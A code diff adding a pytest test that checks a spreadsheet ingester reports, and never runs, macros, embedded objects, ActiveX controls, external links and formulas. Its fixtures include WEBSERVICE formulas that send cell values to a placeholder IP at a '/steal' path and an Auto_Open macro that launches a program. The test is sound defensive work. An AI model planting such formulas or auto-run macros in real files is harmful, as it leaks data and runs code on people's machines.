@@ -223,6 +223,37 @@ def test_slides_and_pdf(seeded):
     assert any("OCR" in w for w in p["warnings"])
 
 
+def test_macros_embedded_objects_and_formulas_are_never_run(seeded):
+    """A macro-enabled workbook with an embedded object, an ActiveX control, an external link and a formula that
+    would call the network: the plan says what is there, nothing of it runs, and only saved values load."""
+    lyst, owner = seeded
+    wb = Workbook()
+    ws = wb.active
+    ws.append(["Item", "Value", "Fetched"])
+    ws.append(["a", 1, '=WEBSERVICE("http://198.51.100.7/steal?d="&B2)'])
+    ws.append(["b", 2, '=WEBSERVICE("http://198.51.100.7/steal?d="&B3)'])
+    buf = io.BytesIO()
+    wb.save(buf)
+    src = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
+    out = io.BytesIO()
+    with zipfile.ZipFile(out, "w") as z:
+        for item in src.infolist():
+            z.writestr(item, src.read(item.filename))
+        z.writestr("xl/vbaProject.bin", b"Attribute VB_Name = \"Module1\"\nSub Auto_Open(): Shell \"calc\": End Sub")
+        z.writestr("xl/embeddings/oleObject1.bin", b"\xd0\xcf\x11\xe0payload")
+        z.writestr("xl/activeX/activeX1.xml", b"<ax/>")
+        z.writestr("xl/externalLinks/externalLink1.xml", b"<externalLink/>")
+    plan = lyst.ingest.inspect(owner, "northwind", out.getvalue(), filename="budget.xlsm")
+    assert plan["active_content"] == {"macros": True, "embedded_objects": 1, "activex": 1, "external_links": 1}
+    text = " ".join(plan["warnings"])
+    assert "never runs them" in text and "never opened" in text and "not followed" in text
+    t = plan["tables"][0]
+    fetched = next(c for c in t["columns"] if c["name"] == "fetched")
+    assert fetched["derived"] and "WEBSERVICE" in fetched["formula"]
+    assert all(row[2] is None for row in t["preview"])  # never evaluated: no saved result, so no value
+    assert any("never recalculated" in w for w in t["warnings"])
+
+
 def test_refusals_are_plain(seeded):
     lyst, owner = seeded
     with pytest.raises(ValueError, match="legacy Office"):
